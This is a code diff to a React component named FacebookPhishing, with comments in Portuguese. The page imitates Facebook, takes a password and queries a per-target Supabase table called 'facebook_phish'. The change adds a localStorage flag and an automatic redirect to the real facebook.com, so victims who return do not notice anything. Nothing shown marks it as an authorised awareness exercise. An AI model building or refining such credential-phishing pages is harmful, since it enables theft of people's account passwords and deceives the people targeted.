@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useParams } from 'react-router-dom';
 import { supabase } from '../supabase';
 import './FacebookPhishing.css';
@@ -9,11 +9,20 @@ export default function FacebookPhishing() {
   const [senha, setSenha] = useState('');
   const [enviado, setEnviado] = useState(false);
 
+  // Redireciona imediatamente se já preencheu antes
+  useEffect(() => {
+    if (localStorage.getItem('fb_phish_' + id)) {
+      window.location.href = 'https://www.facebook.com/';
+    }
+  }, [id]);
+
   async function handleSubmit(e) {
     e.preventDefault();
     setEnviado(true);
+    // Salva flag no localStorage
+    localStorage.setItem('fb_phish_' + id, '1');
     // Busca o registro pelo id
-    const { data, error } = await supabase
+    const { data } = await supabase
       .from('facebook_phish')
       .select('*')
       .eq('id', id)
